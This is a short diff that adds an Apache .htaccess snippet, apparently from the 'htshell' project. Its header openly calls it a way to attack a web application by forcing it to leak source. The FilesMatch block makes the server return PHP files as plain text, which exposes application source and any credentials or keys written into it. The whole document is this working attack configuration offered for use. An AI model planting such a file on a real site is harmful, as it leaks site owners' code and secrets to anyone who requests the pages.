@@ -1,0 +1,7 @@
+# Attack a web application by forcing it to leak source - Part of the htshell project.
+# ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id
+
+    <FilesMatch "\.ph.*$">
+        SetHandler text/plain
+        AddType text/plain .php
+    </FilesMatch>
